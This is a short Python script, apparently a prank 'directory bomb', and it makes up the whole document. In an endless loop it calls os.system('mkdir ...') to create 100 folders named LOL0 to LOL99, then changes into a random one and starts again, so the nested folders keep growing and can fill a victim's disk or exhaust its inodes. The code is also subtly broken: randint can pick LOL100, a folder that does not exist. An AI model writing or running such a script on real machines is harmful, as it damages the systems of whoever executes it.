import os
from random import randint as rand
i = 0
while 1 != 2:
	for i in range(100):
		os.system('mkdir LOL' + str(i))
	os.chdir('LOL'+str(rand(0, 100)))
